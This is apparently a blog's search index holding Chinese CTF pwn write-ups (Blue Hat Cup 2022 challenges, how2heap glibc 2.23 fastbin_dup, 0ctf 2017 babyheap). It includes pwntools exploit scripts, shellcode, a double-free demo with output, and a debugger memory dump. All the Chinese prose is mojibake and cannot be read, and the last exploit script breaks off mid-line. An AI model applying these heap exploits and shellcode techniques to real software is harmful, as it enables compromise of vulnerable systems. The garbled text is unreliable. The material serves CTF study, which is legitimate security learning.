<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2022 è“å¸½æ¯ åˆèµ›</title>
    <link href="/2022/07/10/CTF_competition/2022lm/"/>
    <url>/2022/07/10/CTF_competition/2022lm/</url>
    
    <content type="html"><![CDATA[<h2 id="escape-shellcode"><a href="#escape-shellcode" class="headerlink" title="escape_shellcode"></a>escape_shellcode</h2><p>ä¸€é“å¼€å¯æ²™ç›’çš„shellcodeé¢˜ç›®ï¼Œåªå…è®¸æˆ‘ä»¬ç”¨readå’Œwriteï¼Œæ¶å¿ƒçš„æ˜¯å±…ç„¶æŠŠé™¤äº†ripå¯„å­˜å™¨ä¹‹å¤–çš„æ‰€æœ‰å¯„å­˜å™¨éƒ½ç»™è¦†ç›–æˆåƒåœ¾æ•°æ®ï¼Œå¯¼è‡´æˆ‘ä»¬ä¸èƒ½æ³„éœ²åœ°å€ï¼Œä¹Ÿä¸èƒ½ä½¿ç”¨æ ˆç»“æ„ï¼Œæœ€å¤šèƒ½æœåˆ®æ˜¯ripé‡Œé¢å­˜å‚¨çš„å †åœ°å€ã€‚æ‰€ä»¥æˆ‘ä»¬é‡‡å–çˆ†ç ´çš„æ–¹å¼æ¥æ‰¾flagï¼Œæˆ‘ä»¬flagçš„ä½ä½ä¿æŒ0x120ä¸å˜ï¼Œæ‰€ä»¥åªè¦å¾€é«˜ä½çˆ†ç ´å°±å¥½ã€‚</p><p>æ³¨æ„å‡ ç‚¹ï¼šä¸€ä¸ªæ˜¯æˆ‘ä»¬ä¼šå‘ç°æ¯æ¬¡ripä¸­çš„åœ°å€å’Œå †èµ·å§‹åœ°å€çš„åç§»ä¸ä¸€æ ·ï¼Œæ‰€ä»¥è¦ç”¨ä½è¿ç®—æ¥è§£å†³ï¼Œä¸èƒ½ç”¨subæ±‡ç¼–æ¥è§£å†³æ±‚å–å †èµ·å§‹åœ°å€çš„é—®é¢˜ï¼›ç¬¬äºŒæ˜¯æˆ‘ä»¬ä¸èƒ½åœ¨æ±‡ç¼–ä¹‹å¤–è¿›è¡Œå¾ªç¯ï¼Œè¦åœ¨æ±‡ç¼–é‡Œé¢å®Œæˆå¾ªç¯ï¼Œå¦åˆ™åœ°å€éšæœºåŒ–ä¼šå¯¼è‡´çˆ†ç ´ä¸æˆåŠŸï¼›ç¬¬ä¸‰æ˜¯æ³¨æ„ripä¸å¯è®¿é—®çš„é—®é¢˜ã€‚</p><p>WPå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&quot;./escape_shellcode&quot;</span>)<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br>pld = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">lea r13, [rip]</span><br><span class="hljs-string">mov r11, 0xfffffffff000</span><br><span class="hljs-string">and r13, r11// æ±‚å¾—å †åœ°å€</span><br><span class="hljs-string">add r13, 0x120// ä½¿ä½ä½ä¸º0x120</span><br><span class="hljs-string">mov r10, r13</span><br><span class="hljs-string">mov r14, 0// r14æ˜¯æ¯æ¬¡èµ·å§‹åœ°å€å‡å»çš„é•¿åº¦</span><br><span class="hljs-string">mov r15, 0x10000// r15æ˜¯å¾ªç¯çš„æ¬¡æ•°</span><br><span class="hljs-string">loop :</span><br><span class="hljs-string">mov r13, r10</span><br><span class="hljs-string">mov rdi, 1</span><br><span class="hljs-string">mov rdx, 0x30</span><br><span class="hljs-string">mov rax, 1</span><br><span class="hljs-string">sub r15, 1</span><br><span class="hljs-string">add r14, 0x1000// è¿›è¡Œ0x1000å¤§å°çš„é€’å¢</span><br><span class="hljs-string">sub r13, r14</span><br><span class="hljs-string">mov rsi, r13</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">cmp r15, 0</span><br><span class="hljs-string">ja loop// r15å¤§äº0çš„æ—¶å€™è¿›è¡Œè·³è½¬</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>pld = asm(pld)<br><span class="hljs-comment"># gdb.attach(sh)</span><br>sh.send(pld)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><p>åªè¦çˆ†ç ´1ç§’å°±èƒ½å‡ºflagã€‚</p><p>å…¶ä»–æ–¹æ³•ï¼šå¦‚æœç»™äº†libcç‰ˆæœ¬ï¼Œå¯ä»¥é€šè¿‡é‡Šæ”¾å †çš„fdæ³„éœ²libcï¼Œé€šè¿‡libcé‡Œé¢çš„environæ³„éœ²æ ˆï¼Œé€šè¿‡æ ˆå¯ä»¥æ³„éœ²ä»£ç æ®µçš„åœ°å€ï¼Œä¹Ÿå°±èƒ½å¾—åˆ°flagçš„åœ°å€ã€‚</p><h2 id="Bank"><a href="#Bank" class="headerlink" title="Bank"></a>Bank</h2><p>ç±»ä¼¼äºé“¶è¡ŒATMå–æ¬¾æœºçš„ä¸€é“é¢˜ç›®ï¼Œä¸»è¦çš„éš¾ç‚¹åœ¨ä»£ç å®¡è®¡ï¼Œlibcç‰ˆæœ¬æ˜¯2.31ï¼Œå‘ç°æ¼æ´ä¸»è¦å­˜åœ¨äºTransferè¿™ä¸€ä¸ªåŠŸèƒ½ä¸­ï¼Œæˆ‘ä»¬å¼€å§‹å¯ä»¥åˆ©ç”¨çš„é’±æ˜¯0x190(æœ‰ä¸ªå¼ºåˆ¶ç±»å‹è½¬æ¢)ï¼Œä¹Ÿå°±æ˜¯400å—ï¼ŒTransferä¸­çš„ä¸»è¦å®ç°å¦‚ä¸‹ï¼š</p><blockquote><p>æ³¨æ„åœ¨Transferä¸­å¯ä»¥è¿›è¡Œåˆ·é’±ï¼Œåªè¦æˆ‘ä»¬è¾“å…¥çš„é‡‘é¢å’Œæˆ‘ä»¬ç°æœ‰çš„é‡‘é¢ç›¸åŒå°±å¥½ï¼Œæ¯”èµ›æ—¶å€™å°±æ˜¯æ²¡æƒ³é€šè¿™ä¸€ç‚¹ï¼Œæ²¡é’±ğŸ’´ç”¨æ˜¯çœŸçš„éš¾å—ğŸ˜«ï¼ï¼ï¼è¿™é“é¢˜å°±å«ï¼šç”¨å¤šå°‘å–å¤šå°‘ğŸ˜</p></blockquote><ul><li>adminï¼šèŠ±å¤§äº30å—é’±ï¼Œå¯ä»¥å¾—åˆ°ä¸€ä¸ªæ³„éœ²åœ°å€çš„æœºä¼š</li><li>hackerï¼šèŠ±å¤§äº50å—é’±ï¼Œå¯ä»¥å¾—åˆ°ä¸€ä¸ªé‡Šæ”¾éšæœºåœ°å€å †å—çš„æœºä¼š</li><li>guestï¼šèŠ±å¤§äº5å—é’±ï¼Œå¯ä»¥<code>malloc(0x18)</code>ï¼Œç„¶åå†™å…¥0x10å­—èŠ‚å¤§å°çš„æ•°æ®</li><li>ghostï¼šèŠ±å¤§äº10å—é’±ï¼Œreallocä¸€ä¸ªå¤§å°å°äºç­‰äº0x100çš„å †å—</li><li>abyssï¼šæ— éœ€èŠ±é’±ï¼Œè¿›è¡Œä»»æ„åœ°å€å†™ï¼Œç„¶å<code>exit(0)</code></li></ul><p>æ‰€ä»¥æˆ‘ä»¬å‡†å¤‡æ‰“<code>exit_hook</code>ï¼Œæ³„éœ²libcç„¶åæ‰¾åˆ°<code>_rtld_global</code>ç»“æ„ä½“ï¼Œè¦†ç›–<code>__rtld_lock_unlock_recursive</code>æˆ–è€…<code>_rtld_lock_lock_recursive</code>ä¸ºonegadgetã€‚</p><p>exitå‡½æ•°è°ƒç”¨æµç¨‹ï¼š<code>exit()-&gt;__run_exit_handlers-&gt;_dl_fini-&gt;__rtld_lock_unlock_recursive or _rtld_lock_lock_recursive</code></p><blockquote><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/qq_43116977/article/details/105485947">(9æ¡æ¶ˆæ¯) exit_hookåŠ«æŒ_starssgoçš„åšå®¢-CSDNåšå®¢</a></p></blockquote><p>ä»‹ç»ä¸€ä¸‹reallocå‡½æ•°çš„ç”¨æ³•ï¼Œä¹‹å‰æ²¡é‡åˆ°è¿‡ï¼š</p><p><code>void *realloc(void *ptr, size_t size)</code>ï¼šå…¶ä¸­ptræ˜¯æŒ‡å‘ä¸€ä¸ªè¦é‡æ–°åˆ†é…çš„å †å—ï¼Œå¦‚æœpträ¸ºç©ºï¼Œé‚£ä¹ˆä¼šåˆ†é…ä¸€ä¸ªæ–°çš„å†…å­˜å—ï¼Œå¹¶ä¸”å‡½æ•°è¿”å›ä¸€ä¸ªæŒ‡å‘å®ƒçš„æŒ‡é’ˆï¼›sizeæ˜¯æ–°çš„å†…å­˜å—çš„å¤§å°ï¼Œå¦‚æœä¸º0å¹¶ä¸”ptræŒ‡å‘ä¸€ä¸ªå·²ç»å­˜åœ¨çš„å †å—ï¼Œé‚£ä¹ˆptræŒ‡å‘çš„å†…å­˜å—ä¼šè¢«é‡Šæ”¾ï¼Œå¹¶ä¸”è¿”å›ä¸€ä¸ªç©ºæŒ‡é’ˆã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœç”³è¯·çš„å¤§å°å¤§äºåŸæ¥å †å—çš„å¤§å°ï¼Œreallocä¼šå°†ä¹‹å‰çš„chunké‡Šæ”¾æ‰ï¼Œå†å»å¤„ç†æˆ‘ä»¬è¯·æ±‚çš„å †å—ï¼›å¦‚æœç”³è¯·çš„å¤§å°å°äºå †å—çš„å¤§å°ï¼Œreallocä¼šå¯¹åŸæœ‰çš„chunkè¿›è¡Œåˆ‡åˆ†ï¼Œå°†å¤šä½™çš„ç»™é‡Šæ”¾æ‰ã€‚åœ¨è¿™é“é¢˜ç›®ä¸­ï¼Œå¯ä»¥é€šè¿‡<strong>å…ˆreallocä¸€ä¸ªå¤§çš„å†reallocä¸€ä¸ªå°çš„</strong>è¾¾åˆ°æ•ˆæœã€‚</p>]]></content>
    
    
    <categories>
      
      <category>CTF_competitionï¼šå¤§å“¥åˆ«å·æˆ‘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>è“å¸½æ¯</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å­¦ä¹ how2heapçš„glibc2.23ç³»åˆ—</title>
    <link href="/2022/07/08/Pwn/glibc-2.23/"/>
    <url>/2022/07/08/Pwn/glibc-2.23/</url>
    
    <content type="html"><![CDATA[<h2 id="Fastbin"><a href="#Fastbin" class="headerlink" title="Fastbin"></a>Fastbin</h2><h3 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br><br>&#123;<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;</span>);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Allocating 3 buffers.\n&quot;</span>);<br><br><span class="hljs-type">int</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br><span class="hljs-type">int</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br><span class="hljs-type">int</span> *c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;1st malloc(8): %p\n&quot;</span>, a);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;2nd malloc(8): %p\n&quot;</span>, b);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;3rd malloc(8): %p\n&quot;</span>, c);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Freeing the first one...\n&quot;</span>);<br><br><span class="hljs-built_in">free</span>(a);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);<br><br><span class="hljs-comment">// free(a);</span><br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);<br><br><span class="hljs-built_in">free</span>(b);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);<br><br><span class="hljs-built_in">free</span>(a);<span class="hljs-comment">// äºŒæ¬¡é‡Šæ”¾å †å—a</span><br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);<br><br>a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br>b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br>c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;1st malloc(8): %p\n&quot;</span>, a);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;2nd malloc(8): %p\n&quot;</span>, b);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;3rd malloc(8): %p\n&quot;</span>, c);<br><span class="hljs-comment">// å½¢æˆäº†å †å—aå’Œå †å—bçš„å¾ªç¯é“¾è¡¨</span><br><br><br>assert(a == c);<br><br>&#125;<br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap$ ./fastbin_dup<br>This file demonstrates a simple <span class="hljs-type">double</span>-<span class="hljs-built_in">free</span> attack with fastbins.<br>Allocating <span class="hljs-number">3</span> buffers.<br><span class="hljs-number">1</span>st <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x14b5010<br>2nd <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x14b5030<br>3rd <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x14b5050<br>Freeing the first one...<br>If we <span class="hljs-built_in">free</span> 0x14b5010 again, things will crash because 0x14b5010 is at the top of the <span class="hljs-built_in">free</span> <span class="hljs-built_in">list</span>.<br>So, instead, we&#x27;ll <span class="hljs-built_in">free</span> 0x14b5030.<br>Now, we can <span class="hljs-built_in">free</span> 0x14b5010 again, since it&#x27;s not the head of the <span class="hljs-built_in">free</span> <span class="hljs-built_in">list</span>.<br>Now the <span class="hljs-built_in">free</span> <span class="hljs-built_in">list</span> has [ 0x14b5010, 0x14b5030, 0x14b5010 ]. If we <span class="hljs-built_in">malloc</span> 3 times, we&#x27;ll get 0x14b5010 twice!<br>1st <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x14b5010<br>2nd <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x14b5030<br>3rd <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x14b5010<br></code></pre></td></tr></table></figure><h4 id="0ctf-2017-babyheap"><a href="#0ctf-2017-babyheap" class="headerlink" title="0ctf_2017_babyheap"></a>0ctf_2017_babyheap</h4><p>æ”»å‡»æµç¨‹ï¼š</p><ol><li>åˆ†é…5ä¸ªå †å—ï¼ˆå…¶ä¸­å †å—4çš„è¯·æ±‚å¤§å°è¦å¤§äºç­‰äº0x80ï¼Œç”¨æ¥æ³„éœ²libcçš„åŸºåœ°å€ï¼‰ï¼Œé‡Šæ”¾å †å—1å’Œå †å—2ï¼Œæ­¤æ—¶å †å—1æŒ‡å‘å †å—2ï¼Œ**éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨mallocçš„æ—¶å€™ä¼šæ£€æŸ¥å †å—æ˜¯å¦åœ¨<code>fastbin</code>ä¸­ï¼Œå› æ­¤éœ€è¦æˆ‘ä»¬åˆ†é…2ä¸ªå †å—ï¼Œä¿®æ”¹ä½¿å¾—ç¬¬2ä¸ªå †å—ä¸º<code>fake_chunk</code>**ã€‚</li><li>é€šè¿‡å †æº¢å‡ºï¼Œä¿®æ”¹å †å—2<code>fd</code>æŒ‡é’ˆçš„ä½ä½æŒ‡å‘å †å—4ï¼Œæ­¤æ—¶å°†å †å—4æ¥åœ¨äº†å †å—2çš„åé¢ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å†åˆ†é…çš„0x10çš„å †å—ï¼Œå°±ä¼šåœ¨å †å—4çš„åœ°æ–¹åˆ†é…ï¼Œé€ æˆå †å—é‡å ã€‚<strong>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡å †æº¢å‡ºå°†å †å—4çš„<code>size</code>ä½æ”¹ä¸º0x21ï¼Œå¦åˆ™æ— æ³•ç»•è¿‡æ£€æŸ¥ï¼Œåœ¨mallocçš„æ—¶å€™ä¼šæ£€æŸ¥åˆ†é…çš„å †å—å¤§å°ä¸<code>size</code>æ˜¯å¦ç¬¦åˆ</strong>ã€‚</li><li>é€šè¿‡å †æº¢å‡ºä¿®æ”¹å †å—4çš„<code>size</code>ä¸º0x91ï¼Œé‡Šæ”¾å †å—4ï¼Œå°†å…¶é“¾å…¥<code>unsortedbin</code>ï¼Œæ³„éœ²libcçš„åœ°å€ï¼Œ<strong>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬éœ€è¦åœ¨å †å—4ä¹‹åå†åˆ†é…ä¸€ä¸ªå †å—ï¼Œé˜²æ­¢å…¶é‡Šæ”¾çš„æ—¶å€™ä¸<code>top chunk</code>åˆå¹¶</strong>ã€‚</li><li>åˆ†é…0x60çš„å †å—ï¼Œåˆ©ç”¨é”™ä½åç§»çš„æŠ€å·§å°†å †å—åˆ†é…åœ¨<code>__malloc_hook()</code>å‡½æ•°é™„è¿‘ï¼Œä¿®æ”¹é’©å­ã€‚</li></ol><p><code>main_arena</code>å’Œ<code>__malloc_hook</code>çš„ä½ç½®å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0</span>x7f6a86e67b20 - <span class="hljs-number">0</span>x20<br><span class="hljs-attribute">0x7f6a86e67b00</span> &lt;__memalign_hook&gt;:<span class="hljs-number">0</span>x00007f6a86b28ea0<span class="hljs-number">0</span>x00007f6a86b28a70<br><span class="hljs-attribute">0x7f6a86e67b10</span> &lt;__malloc_hook&gt;:<span class="hljs-number">0</span>x0000000000000000<span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7f6a86e67b20</span> &lt;main_arena&gt;:<span class="hljs-number">0</span>x0000000000000000<span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7f6a86e67b30</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0</span>x0000000000000000<span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7f6a86e67b40</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;:<span class="hljs-number">0</span>x0000000000000000<span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7f6a86e67b50</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;:<span class="hljs-number">0</span>x6a86b28ea0000000<span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7f6a86e67b60</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;:<span class="hljs-number">0</span>x0000000000000000<span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7f6a86e67b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:<span class="hljs-number">0</span>x0000000000000000<span class="hljs-number">0</span>x00005614ee1f61a0<br><span class="hljs-attribute">0x7f6a86e67b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:<span class="hljs-number">0</span>x00005614ee1f60f0<span class="hljs-number">0</span>x00005614ee1f60f0<br><span class="hljs-attribute">0x7f6a86e67b90</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:<span class="hljs-number">0</span>x00005614ee1f60f0<span class="hljs-number">0</span>x00007f6a86e67b88<br><span class="hljs-attribute">0x7f6a86e67ba0</span> &lt;main_arena+<span class="hljs-number">128</span>&gt;:<span class="hljs-number">0</span>x00007f6a86e67b88<span class="hljs-number">0</span>x00007f6a86e67b98<br><span class="hljs-attribute">0x7f6a86e67bb0</span> &lt;main_arena+<span class="hljs-number">144</span>&gt;:<span class="hljs-number">0</span>x00007f6a86e67b98<span class="hljs-number">0</span>x00007f6a86e67ba8<br><span class="hljs-attribute">0x7f6a86e67bc0</span> &lt;main_arena+<span class="hljs-number">160</span>&gt;:<span class="hljs-number">0</span>x00007f6a86e67ba8<span class="hljs-number">0</span>x00007f6a86e67bb8<br><span class="hljs-attribute">0x7f6a86e67bd0</span> &lt;main_arena+<span class="hljs-number">176</span>&gt;:<span class="hljs-number">0</span>x00007f6a86e67bb8<span class="hljs-number">0</span>x00007f6a86e67bc8<br><span class="hljs-attribute">0x7f6a86e67be0</span> &lt;main_arena+<span class="hljs-number">192</span>&gt;:<span class="hljs-number">0</span>x00007f6a86e67bc8<span class="hljs-number">0</span>x00007f6a86e67bd8<br></code></pre></td></tr></table></figure><p>WPå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./0ctf_2017_babyheap&quot;</span>)<br><span class="hljs-comment">#p=remote(&quot;node3.buuoj.cn&quot;,25261)</span><br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">allo</span>(<span class="hljs-params">size</span>):<br>p.recvuntil(<span class="hljs-string">&quot;Command: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>p.recvuntil(<span class="hljs-string">&quot;Size: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill</span>(<span class="hljs-params">idx,size,content</span>):<br>p.recvuntil(<span class="hljs-string">&quot;Command: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;Size: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;Content: &quot;</span>)<br>p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>p.recvuntil(<span class="hljs-string">&quot;Command: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">idx</span>):<br>p.recvuntil(<span class="hljs-string">&quot;Command: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br>p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>allo(<span class="hljs-number">0x10</span>)<span 